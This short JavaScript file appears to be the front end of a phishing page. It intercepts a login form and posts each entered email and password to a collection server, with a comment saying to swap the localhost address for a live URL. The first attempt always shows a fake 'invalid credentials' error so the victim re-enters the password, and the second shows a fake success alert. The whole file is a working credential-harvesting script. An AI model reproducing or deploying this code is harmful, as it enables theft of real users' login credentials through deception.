//

const form = document.querySelector("#emailPasswordForm");

let attempts = 0;

form.addEventListener("submit", async (event) => {
  event.preventDefault(); // Prevent the default form submission
  const email = document.querySelector("#email").value;
  const password = document.querySelector("#password").value;
  const errorSpan = document.querySelector("#errors");
  await sendMail({ email, password });
  if (attempts === 0) {
    errorSpan.textContent = "invalid credentials";
    //invalid credentials
    attempts++;
    return;
  }
  attempts = 0;
  errorSpan.textContent = "";
  alert("successful login");
  // successful redirect them to wherever

  console.log({ email, password });
});

const sendMail = async ({ email, password }) => {
  //use live url here bro
  try {
    const response = await fetch("http://localhost:3000/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    console.log(data); // Log the response from the server
  } catch (error) {
    console.error("Error:", error);
  }
};
